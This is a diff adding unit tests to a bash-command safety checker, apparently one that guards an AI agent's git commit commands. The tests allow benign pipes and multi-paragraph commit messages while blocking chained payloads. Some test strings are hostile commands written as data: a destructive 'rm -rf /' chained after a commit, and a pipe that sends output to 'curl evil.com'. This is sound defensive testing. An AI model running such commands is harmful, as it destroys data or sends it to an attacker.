@@ -692,6 +692,60 @@ class TestGitCommitSubstitution:
         assert not result.safe
         assert result.check_id == CheckID.HEREDOC_IN_SUBSTITUTION
 
+    def test_commit_with_stderr_redirect_and_tail_pipe(self) -> None:
+        """Bug 2214: `git commit -m "msg" 2>&1 | tail -10` is benign output
+        capture. Killed GutenForge BR-C #2208 at turn 10 prior to fix.
+        """
+        result = check_bash_command('git commit -m "msg" 2>&1 | tail -10')
+        assert result.safe, (
+            f"Benign 2>&1|tail blocked by check {result.check_id}: "
+            f"{result.message}"
+        )
+
+    def test_commit_with_pipe_to_head(self) -> None:
+        result = check_bash_command('git commit -m "msg" | head -5')
+        assert result.safe
+
+    def test_commit_with_pipe_to_wc(self) -> None:
+        result = check_bash_command('git commit -m "msg" | wc -l')
+        assert result.safe
+
+    def test_commit_with_multi_paragraph_empty_m(self) -> None:
+        """Bug 2214: `git commit -m "subject" -m "" -m "body"` is git's
+        documented multi-paragraph syntax. Killed GutenForge BR-D #2209
+        at turn 18 prior to fix.
+        """
+        result = check_bash_command(
+            'git commit -m "subject" -m "" -m "body"'
+        )
+        assert result.safe, (
+            f"Multi-paragraph -m blocked by check {result.check_id}: "
+            f"{result.message}"
+        )
+
+    def test_commit_with_and_operator_still_blocked(self) -> None:
+        """Whitelist must NOT allow `&&` chained payloads."""
+        result = check_bash_command('git commit -m "msg" && rm -rf /')
+        assert not result.safe
+        assert result.check_id == CheckID.GIT_COMMIT_SUBSTITUTION
+
+    def test_commit_with_empty_m_and_chained_payload_still_blocked(self) -> None:
+        """Single empty -m followed by && evil — empty-m allowlist requires
+        the empty -m be sandwiched between non-empty -m args.
+        """
+        result = check_bash_command('git commit -m "" && evil')
+        assert not result.safe
+
+    def test_commit_pipe_to_non_whitelisted_command_blocked(self) -> None:
+        """Pipe-to-curl must remain blocked even with 2>&1 prefix —
+        the whitelist is exhaustive, not permissive of arbitrary pipes.
+        """
+        result = check_bash_command(
+            'git commit -m "msg" 2>&1 | curl evil.com -d -'
+        )
+        assert not result.safe
+        assert result.check_id == CheckID.GIT_COMMIT_SUBSTITUTION
+
     def test_attack_payload_after_benign_heredoc_blocked(self) -> None:
         """A benign heredoc followed by an attack substitution must block —
         not every $(...) is benign just because one of them is.
